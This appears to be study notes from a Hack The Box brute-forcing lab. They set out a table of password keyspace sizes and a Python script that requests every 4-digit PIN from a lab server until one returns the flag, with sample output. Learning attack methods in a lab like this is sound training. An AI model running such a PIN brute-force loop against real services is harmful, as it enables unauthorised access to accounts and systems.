```mathml
Possible Combinations = Character Set Size^Password Length
```

|                           | Password Length | Character Set                                         | Possible Combinations               |
| ------------------------- | --------------- | ----------------------------------------------------- | ----------------------------------- |
| `Short and Simple`        | 6               | Lowercase letters (a-z)                               | 26^6 = 308,915,776                  |
| `Longer but Still Simple` | 8               | Lowercase letters (a-z)                               | 26^8 = 208,827,064,576              |
| `Adding Complexity`       | 8               | Lowercase and uppercase letters (a-z, A-Z)            | 52^8 = 53,459,728,531,456           |
| `Maximum Complexity`      | 12              | Lowercase and uppercase letters, numbers, and symbols | 94^12 = 475,920,493,781,698,549,504 |
![](Pasted%20image%2020260612130909.png)
## Cracking the PIN
Python script below as `pin-solver.py`

```python
import requests 
ip = "127.0.0.1" # Change this to your instance IP address 
port = 1234 # Change this to your instance port number 

# Try every possible 4-digit PIN (from 0000 to 9999) 
for pin in range(10000): 
	formatted_pin = f"{pin:04d}" # Convert the number to a 4-digit string (e.g., 7 becomes "0007") 
	print(f"Attempted PIN: {formatted_pin}") 
	
	# Send the request to the server 
	response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}") 
	
	# Check if the server responds with success and the flag is found 
	if response.ok and 'flag' in response.json(): # .ok means status code is 200 (success) 
		print(f"Correct PIN found: {formatted_pin}") 
		print(f"Flag: {response.json()['flag']}") 
		break
```

```shell
3kjS@htb[/htb]$ python pin-solver.py

... 
Attempted PIN: 4039 
Attempted PIN: 4040 
Attempted PIN: 4041 
Attempted PIN: 4042 
Attempted PIN: 4043 
Attempted PIN: 4044 
Attempted PIN: 4045 
Attempted PIN: 4046 
Attempted PIN: 4047 
Attempted PIN: 4048 
Attempted PIN: 4049 
Attempted PIN: 4050 
Attempted PIN: 4051 
Attempted PIN: 4052 
Correct PIN found: 4053 
Flag: HTB{...}
```
